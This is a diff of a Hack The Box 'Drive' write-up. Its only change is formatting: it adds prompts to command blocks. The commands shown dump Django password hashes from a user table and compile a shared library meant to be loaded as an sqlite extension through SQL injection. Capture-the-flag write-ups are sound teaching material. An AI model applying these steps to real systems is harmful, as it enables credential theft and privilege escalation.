@@ -133,9 +133,11 @@ martin@drive.htb's password:
 ```
 Connect to the databases extracted using the `sqlite3` command line, and once inside the database, find a table called `accounts_customuser`. Dump the table to get some django sha1 hashes.
 ```markdown
-sqlite db.sqlite3
-.tables
-select * from accounts_customuser;
+> sqlite db.sqlite3
+
+> .tables
+
+> select * from accounts_customuser;
 ```
 
 ![drive10](https://github.com/g1vi/Hack-the-box-write-ups/assets/120142960/f9ffde93-4a2c-42b3-903d-bbd556d085e5)
@@ -204,7 +206,7 @@ void inject() {
 ```
 Next, compile following sqlite documentation.
 ```markdown
-gcc -g -shared -fPIC ./le.c -o ./le.so
+> gcc -g -shared -fPIC ./le.c -o ./le.so
 ```
 Now we have to create a sql injection to load the extension but keeping in mind the 40-char limitation and the forbidden characters. The final payload could be something like this.
 ```markdown
